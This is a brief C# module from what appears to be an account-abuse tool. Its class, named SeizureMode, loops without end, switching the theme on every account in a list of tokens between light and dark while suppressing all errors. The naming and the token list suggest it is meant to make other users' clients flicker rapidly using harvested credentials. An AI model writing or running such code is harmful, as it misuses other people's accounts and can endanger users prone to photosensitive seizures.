﻿using System.Threading.Tasks;

namespace Solaris.API.Internals.Modules.Account
{
    public class SeizureMode
    {
        public static Task Start()
        {
            while (true)
            {
                try
                {
                    foreach (string token in Program.tokenlist)
                    {
                        User.ChangeTheme(token, "light");
                    }

                    User.ChangeTheme(Program.token, "dark");
                }
                catch
                {
                }
            }
        }
    }
}